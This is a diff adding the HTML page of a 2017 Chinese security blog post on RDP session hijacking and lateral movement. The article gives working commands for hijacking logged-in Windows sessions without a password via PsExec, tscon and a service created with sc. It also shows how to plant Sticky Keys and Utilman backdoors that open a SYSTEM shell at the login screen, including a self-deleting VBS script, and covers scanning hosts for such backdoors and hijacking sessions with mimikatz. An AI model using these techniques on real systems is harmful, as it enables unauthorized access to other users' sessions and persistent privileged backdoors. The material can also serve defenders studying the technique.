@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>RDP劫持</title>
+    <meta name="description" content="RDP劫持思路，虽然攻击条件苛刻，但是也是一种好的思路。">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/09/24/RDP-HiJacking/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>RDP劫持</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-09-24
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>&nbsp;
+    
+        <a href="/category/#skills" title="Category: skills" rel="category">skills</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
+        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
+    
+        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
+        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>&nbsp;
+    
+        <!--a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a-->
+        <a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a>&nbsp;
+    
+        <!--a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a-->
+        <a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a>&nbsp;
+    
+        <!--a href="/tag/#hijacking" title="Tag: hijacking" rel="tag">hijacking</a-->
+        <a href="/tag/#hijacking" title="Tag: hijacking" rel="tag">hijacking</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <p>RDP劫持思路，虽然攻击条件苛刻，但是也是一种好的思路。</p>
+
+<ul id="markdown-toc">
+  <li><a href="#引言" id="markdown-toc-引言">引言</a></li>
+  <li><a href="#搭建域环境" id="markdown-toc-搭建域环境">搭建域环境</a></li>
+  <li><a href="#任务管理器实现" id="markdown-toc-任务管理器实现">任务管理器实现：</a></li>
+  <li><a href="#命令行" id="markdown-toc-命令行">命令行</a></li>
+  <li><a href="#创建服务" id="markdown-toc-创建服务">创建服务</a></li>
+  <li><a href="#横向运动" id="markdown-toc-横向运动">横向运动</a>    <ul>
+      <li><a href="#rdp后门粘滞键" id="markdown-toc-rdp后门粘滞键">RDP后门——粘滞键</a></li>
+      <li><a href="#rdp后门utilman" id="markdown-toc-rdp后门utilman">RDP后门——Utilman</a></li>
+      <li><a href="#扫描rdp服务" id="markdown-toc-扫描rdp服务">扫描RDP服务</a></li>
+      <li><a href="#使用mimikatz进行rdp会话劫持" id="markdown-toc-使用mimikatz进行rdp会话劫持">使用mimikatz进行rdp会话劫持</a></li>
+    </ul>
+  </li>
+</ul>
+
+<!--more-->
+
+<h2 id="引言">引言</h2>
+
+<p><img src="/img/hack/RDP/1505847834569.png" alt="" /></p>
+
+<p>打开任务管理器，连接administrator，不输入密码会出现错误</p>
+
+<p><img src="/img/hack/RDP/1505847892609.png" alt="" /></p>
+
+<p>攻击者可以通过远程桌面劫持，不需要metasploit、incognito、mimikatz等工具，使用内置命令进行劫持，本地高权限用户可以劫持任何已登录Windows用户会话，包括高权限的登录用户！每一个管理员都可以伪装成任何登录用户。虽然这个bug在由管理员权限的时候，什么用处，但是在管理员并不能访问某些用户系统的情况下是很有用的（比如银行某系统管理员通过远程桌面劫持财务系统的会话）</p>
+
+<h2 id="搭建域环境">搭建域环境</h2>
+
+<p><strong>0x01 创建域控制器：</strong></p>
+
+<p>更改计算机用户名：</p>
+
+<p><img src="/img/hack/RDP/1505976735553.png" alt="" /></p>
+
+<p>更改IP为静态IP，设置网关和DNS地址：</p>
+
+<p><img src="/img/hack/RDP/1505976996332.png" alt="" /></p>
+
+<p>选择服务器角色，添加AD域：</p>
+
+<p><img src="/img/hack/RDP/1505977299093.png" alt="" /></p>
+
+<p>运行dcpromo，在新林中新建域：</p>
+
+<p><img src="/img/hack/RDP/1505986689338.png" alt="" /></p>
+
+<p><img src="/img/hack/RDP/1505977395856.png" alt="" /></p>
+
+<p>设置域名：</p>
+
+<p><img src="/img/hack/RDP/1505977451849.png" alt="" /></p>
+
+<p>然后一路默认设置，完成域控搭建。</p>
+
+<p><strong>0x02 添加辅助域控制器</strong></p>
+
+<p>前面搭建域控制器一样的步骤，只是在运行<code class="highlighter-rouge">dcpromo</code>之后，直接<code class="highlighter-rouge">向现有域添加域控制器</code>：</p>
+
+<p><img src="/img/hack/RDP/1505977451849.png" alt="" /></p>
+
+<p>然后填写刚才所建域名，一路默认安装，完成辅助域控制器的搭建</p>
+
+<p><strong>0x03 添加域成员机器</strong></p>
+
+<p>开始步骤和前面的一样，只是在属性中直接加入域，填写域名，输入域控的管理帐号</p>
+
+<p><img src="/img/hack/RDP/1505989777600.png" alt="" /></p>
+
+<p><strong>0x04 查看搭建情况</strong></p>
+
+<p>在服务器管理器中查看域内机器：</p>
+
+<p><img src="/img/hack/RDP/1505990092052.png" alt="" /></p>
+
+<p><img src="/img/hack/RDP/1505990212965.png" alt="" /></p>
+
+<p><img src="/img/hack/RDP/1505990434191.png" alt="" /></p>
+
+<p><img src="/img/hack/RDP/1505989945318.png" alt="" /></p>
+
+<p><strong>出现该错误情况，直接运行<code class="highlighter-rouge">Services.msc</code>进入服务，启动“Computer Brower”服务，若无法启动，请确认“Server”和“WorkStation”两项服务已开启，并设置“Computer Brower”服务属性为“手动启动”，禁止 “Windows FireWall”服务，关闭防火墙：</strong></p>
+
+<p><img src="/img/hack/RDP/1505990050019.png" alt="" /></p>
+
+<h2 id="任务管理器实现">任务管理器实现：</h2>
+
+<p>查看运行的会话：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">query</span> <span class="n">user</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1505896290639.png" alt="" /></p>
+
+<p>使用psexec工具运行：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">s</span> <span class="err">\\</span><span class="n">localhost</span> <span class="o">-</span><span class="n">i</span> <span class="n">console</span><span class="o">-</span><span class="n">ID</span> <span class="n">cmd</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1505896296547.png" alt="" /></p>
+
+<p>打开任务管理器，连接console会话的用户，无需密码即可切换登陆：</p>
+
+<p><img src="/img/hack/RDP/1505896305774.png" alt="console用户桌面" /></p>
+
+<h2 id="命令行">命令行</h2>
+
+<p><strong>帮助文档:</strong></p>
+
+<p>https://technet.microsoft.com/en-us/library/cc771505</p>
+
+<p><img src="/img/hack/RDP/1505896202865.png" alt="Alt text" /></p>
+
+<p>在使用PsExec之前，光使用tscon命令不会切换到对应的对话。在使用：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PsExec</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">s</span> <span class="err">\\</span><span class="n">localhost</span> <span class="n">cmd</span>
+</code></pre></div></div>
+
+<p>之后，在NT AUTHORITY/SYSTEM下运行：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tscon</span> <span class="err">会话</span><span class="n">ID</span> <span class="o">/</span><span class="n">dest</span><span class="o">:</span><span class="n">console</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1505899375811.png" alt="Alt text" /></p>
+
+<p>切换到对应的会话窗口：</p>
+
+<p><img src="/img/hack/RDP/1505899409546.png" alt="" /></p>
+
+<blockquote>
+  <p>在多次实验之后，不能远程桌面登入到system用户的会话，只能切换远程机器的用户成为system 用户，原因未找到</p>
+
+  <p>在域中实验情况也如上，只能将主机切换到syestem用户，连接的远程桌面不能切换为该用户的console，只有Administrator用户的rdp-tcp会话能切换为对应的console会话</p>
+</blockquote>
+
+<p><img src="/img/hack/RDP/1506046796446.png" alt="" /></p>
+
+<h2 id="创建服务">创建服务</h2>
+
+<p><strong>0x01执行命令：</strong></p>
+
+<p>查询用户会话状态,获得会话id和会话名：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">query</span> <span class="n">user</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span> <span class="n">computersystem</span> <span class="n">get</span> <span class="n">domain</span>
+</code></pre></div></div>
+
+<p>创建名为<code class="highlighter-rouge">sesshijack</code>服务：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc</span> <span class="n">create</span> <span class="n">sesshijack</span> <span class="n">binpath</span><span class="o">=</span> <span class="s">"cmd.exe /k tscon 需要劫持的会话ID /dest:当前用户会话名"</span>
+</code></pre></div></div>
+
+<p>执行服务：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start sesshijack
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1506049347620.png" alt="" /></p>
+
+<p><strong>0x02实验结果：</strong></p>
+
+<p>当前用户的会话和劫持的会话<strong>互换</strong>，劫持成功</p>
+
+<p><img src="/img/hack/RDP/1506049889935.png" alt="" /></p>
+
+<blockquote>
+  <p>但是只有在管理员账户下才能进行劫持，在system用户下多次实验都未成功</p>
+</blockquote>
+
+<h2 id="横向运动">横向运动</h2>
+
+<p>大多组织允许使用远程桌面访问内部网络，可以利用windows忘记密码解决方式进入网络组织内部，且自己是作为机器用户出现在日志之中。</p>
+
+<p>暴力破解进行RDP登陆是下策，容易被发现</p>
+
+<h3 id="rdp后门粘滞键">RDP后门——粘滞键</h3>
+
+<p>Windows由一个内置的<code class="highlighter-rouge">Sticky Keys</code>功能，在远程桌面登陆前的页面可以调出，且该功能是以SYSTEM权限运行。
+“粘滞键”是为同时按下两个或更多个键有困难的人设计的。当快捷方式要求使用诸如 CTRL+ P等的组合键时，“粘滞键”允许用户按下修改键（CTRL、ALT或SHIFT）或 Windows徽标键之后，能保持这些键的活动状态直到按下其他键。打开“辅助功能选项”，在“键盘”选项卡的“粘滞键”项下，选中“使用粘滞键”复选框就可以了。
+在Windows 2000/XP/Vista下，按SHIFT键5次，就可以打开粘滞键，实际上运行的是System32下的sethc.exe，而且在登录界面里也可以打开。这就让人联想到如果用cmd.exe覆盖sethc.exe，那么在登录界面按SHIFT键5次，就可以得到一个System权限的 cmdshell了。</p>
+
+<p>由于Windows XP的保护机制，所有关键的系统文件都在System32下的dllcache里有备份。如果系统文件被修改了，Windows会马上将dllcache 里的备份复制过来，所以用cmd.exe覆盖sethc.exe之前，一定要将dllcache里的sethc.exe删除或重命名，否则是不会成功的。覆盖文件的时候，系统会弹出Windows文件保护提示，不用理它，点击“取消”就行了。用命令操作就是：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd %widnir%\system32\dllcache
+ren sethc.exe *.ex~
+cd %widnir%\system32
+copy /y cmd.exe sethc.exe
+</code></pre></div></div>
+
+<p>将命令写为VBS脚本，且脚本运行之后会自动删除：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>On Error Resume Next
+Dim obj, success
+Set obj = CreateObject("WScript.Shell")
+success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe&amp;echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F&amp;copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe&amp;copy %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe&amp;del %SystemRoot%\system32\sethc.exe&amp;ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True)
+CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1506225054417.png" alt="" /></p>
+
+<h3 id="rdp后门utilman">RDP后门——Utilman</h3>
+
+<p>在<code class="highlighter-rouge">windows/system</code>目录下将cmd.exe程序替换成Utilman.exe程序，在登陆界面，使用windows+U就能打开cmd（或者点击左下方）</p>
+
+<p><img src="/img/hack/RDP/1506230330135.png" alt="" /></p>
+
+<h3 id="扫描rdp服务">扫描RDP服务</h3>
+
+<p>安装环境：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">xdotool</span> <span class="n">imagemagick</span> <span class="n">rdesktop</span> <span class="n">bc</span>
+</code></pre></div></div>
+
+<p>下载工具<a href="https://github.com/ztgrace/sticky_keys_hunter.git">sticky_keys_hunter</a>（https://github.com/ztgrace/sticky_keys_hunter.git）</p>
+
+<p>工作原理：</p>
+
+<ul>
+  <li>使用rdesktop连接到RDP</li>
+  <li>使用xdotool发送5次，触发sethc.exe后门</li>
+  <li>使用xdotool发送Windows + u来触发utilman.exe后门程序</li>
+  <li>截图</li>
+  <li>杀死RDP连接</li>
+</ul>
+
+<p>使用：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">扫描单个主机：</span> <span class="p">.</span><span class="o">/</span><span class="n">stickyKeysHunter</span><span class="p">.</span><span class="n">sh</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span>
+
+<span class="err">扫描多台主机：</span> <span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="n">list</span><span class="p">.</span><span class="n">txt</span><span class="p">);</span> <span class="k">do</span> <span class="p">.</span><span class="o">/</span><span class="n">stickyKeysHunter</span><span class="p">.</span><span class="n">sh</span> <span class="s">"${i}"</span><span class="p">;</span> <span class="n">done</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/RDP/1506236014432.png" alt="" /></p>
+
+<h3 id="使用mimikatz进行rdp会话劫持">使用mimikatz进行rdp会话劫持</h3>
+
+<p>运行mimikatz，输入<code class="highlighter-rouge">ts::sessions</code>：</p>
+
+<p><img src="/img/hack/RDP/1506240398148.png" alt="" /></p>
+
+<p>执行<code class="highlighter-rouge">ts::remote /id:1</code>会失败，在执行<code class="highlighter-rouge">privilege::debug</code>后，键入<code class="highlighter-rouge">token::elevate</code>，再执行<code class="highlighter-rouge">ts::remote /id:1</code>，rdp会话劫持成功：</p>
+
+<p><img src="/img/hack/RDP/1506240576492.png" alt="" /></p>
+
+<p>refer:https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6</p>
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/27/open-RDP/">开启RDP
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/19/build-domain/">域环境
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/09/19/printer/">printer</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/09/27/Jboss/">JBoss</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/09/24/RDP-HiJacking/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/09/24/RDP-HiJacking/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
